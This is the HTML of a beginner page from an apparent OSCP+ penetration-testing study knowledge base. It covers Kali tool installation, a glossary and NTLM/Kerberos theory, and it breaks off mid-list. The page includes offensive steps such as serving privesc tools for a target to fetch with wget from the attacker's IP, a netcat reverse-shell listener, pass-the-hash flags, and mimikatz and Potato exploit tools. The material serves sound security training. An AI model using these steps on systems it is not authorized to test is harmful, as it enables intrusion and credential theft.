@@ -1,0 +1,504 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Beginner Foundations · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">👶 Beginner Foundations</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v1-[kali-preinstalled]-what-ships-with-kali-vs-what-you-must-add">[KALI-PREINSTALLED]  📦 what ships with Kali vs. what you must add</a><a class="navlink lvl1" href="#v1-[kali-setup]-get-your-kali-ready-once-do-this-before-practising">[KALI-SETUP]  🛠️ get your Kali ready ONCE (do this before practising)</a><a class="navlink lvl1" href="#v1-[glossary]-plain-english-jargon-what-these-words-actually-mean">[GLOSSARY]  📖 plain-English jargon (what these words actually mean)</a><a class="navlink lvl1" href="#v1-[concepts]-how-it-actually-works-theory-why-the-attack-works">[CONCEPTS]  🧠 how it actually works (theory → why the attack works)</a><a class="navlink lvl2" href="#v1-[concept-ntlm]-ntlm-the-nt-hash">[CONCEPT-NTLM]  NTLM &amp; the NT hash</a><a class="navlink lvl2" href="#v1-[concept-kerberos]-kerberos-tickets-tgt-tgs">[CONCEPT-KERBEROS]  Kerberos — tickets, TGT, TGS</a><a class="navlink lvl2" href="#v1-[concept-spn]-service-principal-name-spn">[CONCEPT-SPN]  Service Principal Name (SPN)</a><a class="navlink lvl2" href="#v1-[concept-sid]-sid-rid-full-detail-in-[ad-sid]">[CONCEPT-SID]  SID &amp; RID  → full detail in [AD-SID]</a><a class="navlink lvl2" href="#v1-[concept-tokens]-windows-access-tokens">[CONCEPT-TOKENS]  Windows access tokens</a><a class="navlink lvl2" href="#v1-[concept-ad-structure]-domain-dc-forest-ou-gpo-gc">[CONCEPT-AD-STRUCTURE]  Domain, DC, Forest, OU, GPO, GC</a><a class="navlink lvl2" href="#v1-[concept-ldap]-ldap-vs-ad">[CONCEPT-LDAP]  LDAP vs AD</a><a class="navlink lvl2" href="#v1-[concept-delegation]-delegation-why-its-abusable">[CONCEPT-DELEGATION]  Delegation (why it&#x27;s abusable)</a><a class="navlink lvl2" href="#v1-[concept-dcsync]-dcsync-replication">[CONCEPT-DCSYNC]  DCSync / replication</a><a class="navlink lvl2" href="#v1-[concept-hashes]-hash-types-crack-vs-pass">[CONCEPT-HASHES]  hash types — crack vs. pass</a><a class="navlink lvl2" href="#v1-[concept-linux-perms]-suidsgid-sudo-capabilities-what-they-are">[CONCEPT-LINUX-PERMS]  SUID/SGID, sudo, capabilities (what they *are*)</a><a class="navlink lvl2" href="#v1-[concept-web-auth]-sessions-cookies-jwt">[CONCEPT-WEB-AUTH]  sessions, cookies, JWT</a><a class="navlink lvl1" href="#v1-[first-box-walkthrough]-see-it-all-connect-two-full-examples">[FIRST-BOX-WALKTHROUGH]  🎬 see it all connect (two full examples)</a><a class="navlink lvl1" href="#v1-[study-tracker]-turn-practice-into-a-pass">[STUDY-TRACKER]  📊 turn practice into a pass</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v1-oscp-knowledge-base-volume-9">OSCP+ KNOWLEDGE BASE — VOLUME 9</div>
+<h2 id="v1--beginner-foundations-kali-setup-glossary-first-box-walkthroughs">👶 BEGINNER FOUNDATIONS: KALI SETUP · GLOSSARY · FIRST-BOX WALKTHROUGHS<a class="anchor" href="#v1--beginner-foundations-kali-setup-glossary-first-box-walkthroughs">#</a></h2>
+<blockquote>Start here if the other volumes feel like a foreign language. Read <code class="tag">[NOOB-PRIMER]</code> (Vol 0) first, then this.</blockquote>
+<hr>
+<h1 id="v1-[kali-preinstalled]-what-ships-with-kali-vs-what-you-must-add">[KALI-PREINSTALLED]  📦 what ships with Kali vs. what you must add<a class="anchor" href="#v1-[kali-preinstalled]-what-ships-with-kali-vs-what-you-must-add">#</a></h1>
+<p><strong>How Kali packaging works:</strong> the default Kali image installs the <code>kali-linux-default</code> metapackage — that&#x27;s most of what you need. Bigger sets exist (<code>kali-linux-large</code>, <code>kali-linux-everything</code>) but you don&#x27;t need them. A handful of OSCP-critical tools are <strong>NOT</strong> in the default image and you install them yourself. <code class="tag">[COMMUNITY]</code> + <code class="tag">[GENERAL]</code></p>
+<p><strong>Check what you already have (before installing anything):</strong></p>
+<pre><code>for t in nmap ffuf feroxbuster gobuster nikto sqlmap hydra john hashcat searchsploit \
+  smbclient smbmap enum4linux crackmapexec netexec impacket-scripts evil-winrm responder \
+  proxychains4 socat nc dnsrecon snmpwalk wpscan whatweb medusa cewl crunch; do
+  printf &quot;%-16s &quot; &quot;$t&quot;; command -v &quot;$t&quot; &gt;/dev/null &amp;&amp; echo OK || echo &quot;MISSING&quot;; done
+# list a metapackage&#x27;s contents:  apt-cache depends kali-linux-default</code></pre>
+<h3 id="v1--tier-1-usually-preinstalled-just-verify-dont-reinstall">✅ Tier 1 — usually PREINSTALLED (just verify, don&#x27;t reinstall)<a class="anchor" href="#v1--tier-1-usually-preinstalled-just-verify-dont-reinstall">#</a></h3>
+<pre><code>nmap · netcat(nc) · metasploit · burpsuite (Community) · sqlmap · nikto · dirb · gobuster
+ffuf · feroxbuster · whatweb · wafw00f · wpscan · hydra · medusa · john · hashcat · hashid
+smbclient · smbmap · enum4linux · crackmapexec · impacket-scripts · ldapsearch(ldap-utils)
+snmpwalk(snmp) · onesixtyone · dnsrecon · dnsenum · responder · proxychains4 · socat
+searchsploit(exploitdb) · curl · wget · ssh · tmux · cewl · crunch · git · python3</code></pre>
+<p>*(evil-winrm ships on recent Kali; if <code>command -v evil-winrm</code> says MISSING, install it — Tier 2.)*</p>
+<h3 id="v1--tier-2-not-default-apt-install-the-classic-gaps">🔧 Tier 2 — NOT default → <code>apt install</code> (the classic gaps)<a class="anchor" href="#v1--tier-2-not-default-apt-install-the-classic-gaps">#</a></h3>
+<pre><code>sudo apt update &amp;&amp; sudo apt install -y seclists netexec evil-winrm exploitdb sshuttle pspy \
+  ldapdomaindump windapsearch nbtscan dnsutils
+# ⭐ seclists is the #1 &quot;why isn&#x27;t this here already&quot; gap — you need it for fuzzing wordlists.
+# netexec (nxc) is the modern crackmapexec; keep both.</code></pre>
+<h3 id="v1--tier-3-python-tools-pipx-isolated-no-dependency-hell">🐍 Tier 3 — Python tools → <code>pipx</code> (isolated, no dependency hell)<a class="anchor" href="#v1--tier-3-python-tools-pipx-isolated-no-dependency-hell">#</a></h3>
+<pre><code>sudo apt install -y pipx &amp;&amp; pipx ensurepath
+pipx install bloodhound        # bloodhound-python collector
+pipx install certipy-ad        # ADCS (ESC1-8)
+pipx install bloodyAD          # LDAP/ACL abuse
+pipx install mitm6             # IPv6 relay (lab only; exam poisoning banned)
+# (lsassy, pypykatz often come with netexec deps; else: pipx install lsassy pypykatz)</code></pre>
+<h3 id="v1--tier-4-not-in-apt-at-all-download-from-github-into-tools-see-[kali-setup]-step-4">⬇️ Tier 4 — NOT in apt at all → download from GitHub into <code>~/tools</code> (see <code class="tag">[KALI-SETUP]</code> step 4)<a class="anchor" href="#v1--tier-4-not-in-apt-at-all-download-from-github-into-tools-see-[kali-setup]-step-4">#</a></h3>
+<pre><code>linpeas.sh · winPEASx64.exe · pspy64 · chisel(+.exe) · ligolo-ng (proxy+agent)
+PrintSpoofer64.exe · GodPotato · RoguePotato · JuicyPotatoNG · SweetPotato · RunasCs.exe
+PowerView.ps1 · PowerUp.ps1 · SharpHound.exe · Rubeus.exe · mimikatz.exe · kerbrute
+# all URLs are in [RESOURCES] / [RESOURCES-MORE].</code></pre>
+<blockquote><strong>Automation shortcut (optional):</strong> community scripts like <strong>pimpmykali</strong> (Dewalt) or WeaponizeKali install ~95% of these in one go. Fine for *setup* — but you must still <strong>understand</strong> each tool (the exam is manual). Don&#x27;t let a script be a substitute for knowing what <code>netexec</code>/<code>ligolo</code>/<code>secretsdump</code> actually do.</blockquote>
+<hr>
+<h1 id="v1-[kali-setup]-get-your-kali-ready-once-do-this-before-practising">[KALI-SETUP]  🛠️ get your Kali ready ONCE (do this before practising)<a class="anchor" href="#v1-[kali-setup]-get-your-kali-ready-once-do-this-before-practising">#</a></h1>
+<p>Nothing kills momentum like discovering mid-box that a tool isn&#x27;t installed. Do this setup once.</p>
+<blockquote>👉 For <strong>what each tool does + whether it&#x27;s allowed in the exam</strong> (✅ / 1️⃣ MSF-one-target / ⚠️ / ⛔), see **<code class="tag">[KALI-TOOLBOX]</code>** (every exam-usable Kali tool grouped by phase). This section = *install* them; that section = *understand &amp; use* them.</blockquote>
+<h2 id="v1-1-update-the-system">1) Update the system<a class="anchor" href="#v1-1-update-the-system">#</a></h2>
+<pre><code>sudo apt update &amp;&amp; sudo apt full-upgrade -y</code></pre>
+<h2 id="v1-2-install-the-core-toolset-most-are-pre-installed-on-kali-this-fills-gaps">2) Install the core toolset (most are pre-installed on Kali; this fills gaps)<a class="anchor" href="#v1-2-install-the-core-toolset-most-are-pre-installed-on-kali-this-fills-gaps">#</a></h2>
+<pre><code>sudo apt install -y seclists wordlists nmap feroxbuster ffuf gobuster nikto \
+  smbclient smbmap enum4linux nbtscan snmp onesixtyone ldap-utils \
+  netexec impacket-scripts evil-winrm responder proxychains4 exploitdb \
+  hashcat john sqlmap hydra dnsrecon curl wget git python3-pip pipx mingw-w64 gcc-multilib
+sudo apt update &amp;&amp; sudo apt install exploitdb    # installs searchsploit + local Exploit-DB (usually pre-installed on Kali)
+searchsploit -u                                  # update the local Exploit-DB copy
+# tools that are better via pipx (isolated):
+pipx install bloodhound            # bloodhound-python collector
+pipx install netexec               # if apt version is old (replaces crackmapexec)</code></pre>
+<p>*(If a package name errors, that tool may already exist or have a slightly different name — check with <code>which &lt;tool&gt;</code>. Don&#x27;t panic; you rarely need all of them on one box.)*</p>
+<h2 id="v1-3-unzip-rockyou-the-main-password-wordlist-one-time">3) Unzip rockyou (the main password wordlist) — one time<a class="anchor" href="#v1-3-unzip-rockyou-the-main-password-wordlist-one-time">#</a></h2>
+<pre><code>sudo gunzip /usr/share/wordlists/rockyou.txt.gz     # → /usr/share/wordlists/rockyou.txt
+ls -l /usr/share/seclists                            # confirm SecLists is there</code></pre>
+<h2 id="v1-4-build-a-tools-folder-of-things-you-copy-to-targets">4) Build a <code>~/tools</code> folder of things you copy TO targets<a class="anchor" href="#v1-4-build-a-tools-folder-of-things-you-copy-to-targets">#</a></h2>
+<p>These aren&#x27;t apt packages — they&#x27;re scripts/binaries you download once, then serve to the victim with a web server. <strong>Download from the official GitHub &quot;Releases&quot; pages.</strong></p>
+<pre><code>mkdir -p ~/tools/{linux,windows}
+# LINUX enumeration/privesc (put in ~/tools/linux):
+#   linpeas.sh          (PEASS-ng releases)
+#   pspy64              (DominicBreuker/pspy releases)
+#   chisel (linux amd64), agent/proxy for ligolo-ng (linux)
+# WINDOWS enumeration/privesc (put in ~/tools/windows):
+#   winPEASx64.exe      (PEASS-ng releases)
+#   PrintSpoofer64.exe  (itm4n/PrintSpoofer releases)
+#   GodPotato-NET4.exe  (BeichenDream/GodPotato releases)
+#   nc.exe              (netcat for windows)
+#   chisel.exe, ligolo agent.exe (windows amd64)
+#   PowerView.ps1, PowerUp.ps1, SharpHound.exe, mimikatz.exe</code></pre>
+<p>Grab them once with your browser or <code>wget &lt;release-url&gt; -O ~/tools/linux/linpeas.sh</code>. (Exact URLs change with versions — search &quot;linpeas releases&quot; etc.)</p>
+<h2 id="v1-5-serve-tools-to-a-target-youll-do-this-constantly">5) Serve tools to a target (you&#x27;ll do this constantly)<a class="anchor" href="#v1-5-serve-tools-to-a-target-youll-do-this-constantly">#</a></h2>
+<pre><code>cd ~/tools/linux &amp;&amp; python3 -m http.server 80          # then on target: wget http://$IP/linpeas.sh
+# your $IP = your VPN address:  ip addr show tun0</code></pre>
+<h2 id="v1-6-per-target-folders-make-one-per-box">6) Per-target folders (make one per box)<a class="anchor" href="#v1-6-per-target-folders-make-one-per-box">#</a></h2>
+<pre><code>mkdir -p ~/oscp/target1/{scans,loot,exploits,www} &amp;&amp; cd ~/oscp/target1</code></pre>
+<h2 id="v1-7-nice-to-have-quality-of-life">7) Nice-to-have quality-of-life<a class="anchor" href="#v1-7-nice-to-have-quality-of-life">#</a></h2>
+<pre><code># fix rockyou path habit, add a quick alias to your ~/.zshrc:
+echo &#x27;alias serve=&quot;python3 -m http.server 80&quot;&#x27; &gt;&gt; ~/.zshrc
+echo &#x27;alias tun=&quot;ip addr show tun0 | grep inet&quot;&#x27; &gt;&gt; ~/.zshrc
+source ~/.zshrc
+# BloodHound GUI (for AD): install per current docs (BloodHound CE / neo4j)</code></pre>
+<p>✅ <strong>You&#x27;re ready.</strong> You never need to redo this except updating tools occasionally.</p>
+<hr>
+<h1 id="v1-[glossary]-plain-english-jargon-what-these-words-actually-mean">[GLOSSARY]  📖 plain-English jargon (what these words actually mean)<a class="anchor" href="#v1-[glossary]-plain-english-jargon-what-these-words-actually-mean">#</a></h1>
+<p><strong>Enumeration</strong> — thoroughly poking a target to discover everything about it (open ports, services, versions, files, users). 80% of the exam. &quot;Enumerate&quot; = &quot;investigate/list.&quot;</p>
+<p><strong>Foothold / Initial access</strong> — your *first* way to run commands on the target (a shell or code execution). Getting &quot;in.&quot;</p>
+<p><strong>Shell</strong> — an interactive command prompt on the target. Your goal on every box.</p>
+<ul>
+<li><strong>Reverse shell</strong> — the *target* connects back to *you*. (You run a listener; the target dials out.) Most common.</li>
+<li><strong>Bind shell</strong> — the *target* opens a port and *you* connect to it. Used when the target can&#x27;t dial out.</li>
+<li><strong>Webshell</strong> — a script (e.g. PHP) you upload to a web server that runs commands via the browser.</li>
+</ul>
+<p><strong>Listener</strong> — a program on *your* Kali waiting for the target&#x27;s reverse shell to connect. Usually <code>nc -lvnp 443</code>.</p>
+<p><strong>Payload</strong> — the code that gives you a shell (e.g. a reverse-shell one-liner, or a <code>.exe</code> from msfvenom).</p>
+<p><strong>LHOST / LPORT</strong> — *your* IP and port (where the shell comes back to). <strong>RHOST / RPORT</strong> — the *target&#x27;s* IP and port.</p>
+<p><strong>TTY / &quot;stabilize the shell&quot;</strong> — upgrading a clunky shell into a proper interactive one (arrow keys, tab-complete, Ctrl-C don&#x27;t kill it). See <code class="tag">[SHELL-QUICK]</code>.</p>
+<p><strong>Privilege escalation (privesc)</strong> — going from a low-power user to <strong>root</strong> (Linux) or <strong>SYSTEM/Administrator</strong> (Windows). The second 10 points on each box.</p>
+<p><strong>Lateral movement</strong> — using creds/hashes from one machine to get into *another* machine (same network). Core of AD.</p>
+<p><strong>Pivoting</strong> — routing your tools *through* a compromised machine to reach a network you can&#x27;t touch directly. See <code class="tag">[PIVOT-QUICK]</code>.</p>
+<p><strong>Enumeration vs Exploitation</strong> — first you *find* the weakness (enum), then you *use* it (exploit).</p>
+<p><strong>CVE</strong> — a public ID for a known vulnerability (e.g. CVE-2021-4034). <strong>PoC / Exploit</strong> — code that abuses a vulnerability. See <code class="tag">[CVE-HITS]</code>.</p>
+<p><strong>Hash</strong> — a scrambled (one-way) version of a password. You &quot;crack&quot; it (guess the original) with a wordlist, or sometimes *use it directly* (Pass-the-Hash).</p>
+<ul>
+<li><strong>NTLM</strong> — Windows password hash. <strong>NetNTLMv2</strong> — a hash captured from network authentication (e.g. by Responder).</li>
+<li><strong>Pass-the-Hash (PtH)</strong> — logging in with the NTLM hash itself, no need to crack it.</li>
+</ul>
+<p><strong>Wordlist</strong> — a big text file of guesses (passwords or paths). <code>rockyou.txt</code> is the famous one.</p>
+<ul>
+<li><strong>Brute force</strong> — trying many passwords against one account. <strong>Password spraying</strong> — trying *one* password against *many* accounts (safer re: lockouts).</li>
+</ul>
+<p><strong>Active Directory (AD)</strong> — Microsoft&#x27;s system for managing users/computers in a Windows network. The 40-point exam set. Key pieces:</p>
+<ul>
+<li><strong>Domain Controller (DC)</strong> — the server that runs AD (holds all accounts). Own it = own the domain.</li>
+<li><strong>Kerberos / TGT / TGS</strong> — AD&#x27;s login ticket system. <strong>Kerberoasting</strong> = get crackable hashes of service accounts. <strong>AS-REP roasting</strong> = get crackable hashes of users with a specific weak setting.</li>
+<li><strong>DCSync</strong> — asking the DC to hand over all password hashes (needs high privilege). Game over.</li>
+<li><strong>BloodHound</strong> — a tool that maps AD and draws the shortest path to Domain Admin.</li>
+</ul>
+<p><strong>SMB (445)</strong> — Windows file sharing + the protocol used for tons of AD attacks. <strong>LDAP (389)</strong> — the &quot;phone book&quot; query protocol for AD.</p>
+<p><strong>Web vulns (quick defs):</strong> <strong>LFI</strong> = read local files via a web param. <strong>RFI</strong> = include a remote file → code exec. <strong>SQLi</strong> = inject SQL to read the database. <strong>SSTI</strong> = inject template code → exec. <strong>SSRF</strong> = make the server fetch a URL for you. <strong>XXE</strong> = abuse XML parsing to read files. <strong>IDOR</strong> = access other users&#x27; data by changing an ID. <strong>Command injection</strong> = your input reaches the OS shell.</p>
+<p><strong>SUID</strong> — a Linux file flag letting a program run as its owner (often root) → privesc if abusable. <strong>sudo</strong> — run a command as another user (usually root). <strong>Capability</strong> — a fine-grained Linux root-power on a binary. <strong>Cron</strong> — scheduled tasks (often run as root).</p>
+<p><strong>proxychains / SOCKS</strong> — tools/protocol to send your commands through a pivot. <strong>vhost</strong> — a website served based on the hostname (add to <code>/etc/hosts</code>). <strong>subnet</strong> — a range of IPs (e.g. <code>172.16.5.0/24</code>).</p>
+<p><strong>local.txt / proof.txt</strong> — the flag files. <code>local.txt</code> = proof of low-priv access (10 pts). <code>proof.txt</code> = proof of root/SYSTEM (10 pts).</p>
+<p><strong>Revert</strong> — reset a target to a clean state (free; do it if a box acts broken). <strong>Rabbit hole</strong> — a dead-end you waste time on; the exam&#x27;s biggest trap.</p>
+<hr>
+<h1 id="v1-[concepts]-how-it-actually-works-theory-why-the-attack-works">[CONCEPTS]  🧠 how it actually works (theory → why the attack works)<a class="anchor" href="#v1-[concepts]-how-it-actually-works-theory-why-the-attack-works">#</a></h1>
+<blockquote>The <code class="tag">[GLOSSARY]</code> gives one-liners; this gives the *understanding*. Each concept ends with <strong>the attack it enables</strong> — that&#x27;s the point of learning it. This is the theory layer PEN-200 assumes.</blockquote>
+<h2 id="v1-windows-ad-authentication-the-big-picture">Windows / AD authentication — the big picture<a class="anchor" href="#v1-windows-ad-authentication-the-big-picture">#</a></h2>
+<p>Windows proves *who you are* with one of two protocols: <strong>NTLM</strong> (older, challenge-response) or <strong>Kerberos</strong> (AD default, ticket-based). Both ultimately rely on a <strong>password hash</strong>, never the plaintext. Understand these two + how they store/pass secrets and 80% of AD &quot;clicks.&quot;</p>
+<h2 id="v1-[concept-ntlm]-ntlm-the-nt-hash">[CONCEPT-NTLM]  NTLM &amp; the NT hash<a class="anchor" href="#v1-[concept-ntlm]-ntlm-the-nt-hash">#</a></h2>
+<ul>
+<li>Your password is stored as an <strong>NT hash</strong> (unsalted MD4 of the password) in the SAM (local) or NTDS.dit (domain).</li>
+<li><strong>NTLM authentication</strong> is challenge-response: server sends a challenge, client encrypts it with the NT hash → server verifies. The plaintext never crosses the wire; the <strong>NT hash itself is the secret</strong>.</li>
+<li><strong>→ Attack (Pass-the-Hash):</strong> because the NT hash *is* the credential, if you steal it you can authenticate <strong>without cracking it</strong> (<code>nxc -H</code>, <code>evil-winrm -H</code>, <code>psexec -hashes</code>). This is why dumping SAM/LSASS is game-changing.</li>
+<li><strong>NetNTLMv1/v2</strong> = the hash of the *challenge-response* captured on the wire (Responder). It&#x27;s <strong>NOT</strong> the NT hash — you can&#x27;t PtH it; you <strong>crack</strong> it (<code>-m 5600</code>) or <strong>relay</strong> it.</li>
+</ul>
+<h2 id="v1-[concept-kerberos]-kerberos-tickets-tgt-tgs">[CONCEPT-KERBEROS]  Kerberos — tickets, TGT, TGS<a class="anchor" href="#v1-[concept-kerberos]-kerberos-tickets-tgt-tgs">#</a></h2>
+<p>The DC runs a <strong>KDC</strong>. Flow: (1) you prove yourself to the KDC and get a <strong>TGT</strong> (Ticket-Granting Ticket) — encrypted with the *krbtgt* account&#x27;s key; (2) you present the TGT to ask for a <strong>TGS</strong> (service ticket) for a specific service — encrypted with *that service account&#x27;s* key; (3) you present the TGS to the service, which decrypts it to trust you.</p>
+<ul>
